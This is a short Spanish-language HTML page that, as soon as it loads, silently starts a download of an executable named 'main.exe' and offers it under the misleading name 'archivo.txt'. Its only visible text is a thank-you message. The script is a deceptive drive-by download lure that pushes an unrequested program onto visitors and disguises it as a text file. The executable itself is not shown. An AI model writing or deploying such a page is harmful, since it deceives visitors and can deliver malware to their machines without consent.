<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Descarga Automática</title>
  <script>
    window.onload = function() {
      const enlace = document.createElement("a");
      enlace.href = "main.exe"; // Ruta al archivo
      enlace.download = "archivo.txt"; // Nombre sugerido
      enlace.click(); // Dispara la descarga
    };
  </script>
</head>
<body>
  <h1>Gracias por visitar, tu archivo se descargará automáticamente</h1>
</body>
</html>
